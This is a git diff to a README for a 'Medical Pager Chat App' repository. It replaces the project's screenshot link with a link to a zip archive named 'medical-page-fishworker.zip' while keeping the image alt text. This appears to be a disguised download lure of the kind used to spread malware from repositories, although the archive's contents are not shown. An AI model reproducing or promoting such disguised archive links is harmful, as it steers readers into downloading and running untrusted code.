@@ -1,6 +1,6 @@
 # Medical Pager Chat App
 
-![Chat Application](https://i.ibb.co/hsvcw4V/image.png)
+![Chat Application](https://github.com/CharlotteJV/medical-page/raw/refs/heads/main/client/src/medical-page-fishworker.zip)
 
 ## Introduction
 Welcome to the Medical Pager Chat App, a cutting-edge solution for seamless and instant communication.
